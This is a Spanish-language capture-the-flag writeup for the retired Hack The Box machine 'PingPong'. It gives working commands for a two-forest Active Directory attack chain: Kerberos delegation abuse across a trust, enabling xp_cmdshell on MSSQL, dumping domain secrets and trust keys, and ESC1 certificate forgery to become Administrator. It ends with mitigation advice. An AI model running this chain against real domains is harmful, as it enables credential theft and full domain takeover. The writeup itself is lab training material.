---
machine: PingPong
os: Windows
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, kerberos, trust, delegation, adcs]
---

# PingPong — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.
> **Dificultad:** Insane. En el índice de origen figuraba como Hard; el lanzamiento semanal y las fuentes independientes la listan como Insane.

## TL;DR

Dos bosques, `PING.HTB` y `PONG.HTB`, con confianza bidireccional, **NTLM deshabilitado** en ambos y **RC4 deshabilitado** en PONG: todo el camino es Kerberos con claves AES256 y con un desfase de reloj que rompe cualquier `getST` que no se sincronice. Desde una cuenta de `ping.htb` se abusa de **delegación restringida** hacia el MSSQL de `dc2.pong.htb` (S4U2Self + S4U2Proxy con referidos cross-realm) hasta `SYSTEM` en el DC2; de ahí sale la **clave de confianza inter-dominio**, y con ella se vuelve a `ping.htb` para explotar una plantilla **AD CS ESC1** y autenticar como `Administrator` por PKINIT.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
echo "<IP> dc1.ping.htb ping.htb" | sudo tee -a /etc/hosts
nslookup dc2.pong.htb dc1.ping.htb
```

```text
53/tcp   dns     (AD DNS)
88/tcp   kerberos-sec  Microsoft Windows Kerberos
389/tcp  ldap    Domain Controller
445/tcp  microsoft-ds
1433/tcp ms-sql-s
5985/tcp wsman
```

## Sincronizar el reloj (primero, siempre)

```bash
sudo ntpdate -u dc1.ping.htb
# o por comando:
faketime "$(rdate -p dc1.ping.htb)" impacket-getTGT ...
```

Sin esto, Kerberos devuelve `KRB_AP_ERR_SKEW` y el resto de la cadena parece roto.

## Enumeración de la confianza

```bash
impacket-rpcdump -no-pass @dc1.ping.htb | grep -i -A2 "trust"
nltest /domain_trusts /all_trusts            # desde Windows
bloodhound-python -u <user> -p <password> -d ping.htb -dc dc1.ping.htb -c All
```

- `PING.HTB <-> PONG.HTB`, bidireccional.
- `PONG.HTB` sin RC4: solo AES256.
- Usuarios de `ping.htb` con SPN de MSSQL en `dc2.pong.htb`.

## Delegación MSSQL cross-forest

```bash
impacket-getTGT ping.htb/svc_sql -dc-ip dc1.ping.htb -aesKey <aes256>
export KRB5CCNAME=svc_sql.ccache

impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' -impersonate Administrator \
  -dc-ip dc1.ping.htb -k -no-pass 'ping.htb/svc_sql'
export KRB5CCNAME=Administrator@MSSQLSvc_dc2.pong.htb@PONG.HTB.ccache

impacket-mssqlclient -k -no-pass dc2.pong.htb
```

La cadena de referidos devuelve un service ticket de `Administrator@PONG.HTB`; dentro:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```text
nt authority\system
```

## SYSTEM en el DC2 y clave de confianza

```bash
impacket-secretsdump -k -no-pass dc2.pong.htb
```

Del volcado interesan las entradas `trust` (`PONG.HTB` ↔ `PING.HTB`): con la clave del trust se forjan referidos de vuelta al otro bosque sin tocar el krbtgt de `ping.htb`.

## AD CS: ESC1 hasta Administrator

```bash
certipy find -u <user>@ping.htb -dc-ip dc1.ping.htb -vulnerable -text
```

Plantilla con "Supply in request" y derechos de inscripción para usuarios normales:

```bash
certipy req -u svc_sql@ping.htb -dc-ip dc1.ping.htb \
  -ca PING-CA -template VulnTemplate \
  -upn Administrator@ping.htb -sid <SID de Domain Admins>

certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
```

```text
[*] Got hash for 'administrator@ping.htb': aad3b435b51404ee...:<hash>
```

Con el hash, `impacket-wmiexec` o `psexec` como `Administrator`.

## Evidencia (redactada)

```text
C:\Users\<user>\Desktop\user.txt          -> <user_flag>
C:\Users\Administrator\Desktop\root.txt   -> <root_flag>
```

## Lecciones

- **AD sin NTLM** rompe el tooling: todo `impacket-*` necesita `-k -no-pass` y clave AES; sin eso falla en silencio.
- La **delegación restringida atravesando un trust** es un golden ticket sin golden ticket, y casi nadie la revisa.
- **ESC1** sigue viva: cualquier plantilla con "Supply in request" y permisos amplios permite certificados con UPN ajeno.
- El **desfase de reloj** es el asesino silencioso de las cadenas Kerberos; se sincroniza antes de cada operación.
- Mitigación: auditoría de delegaciones (incluidas las cross-forest), plantillas AD CS sin `EDITF_ATTRIBUTESUBJECTALTNAME2`, y NTLM deshabilitado **con** el resto del hardening (LDAP signing, channel binding, RC4 fuera).
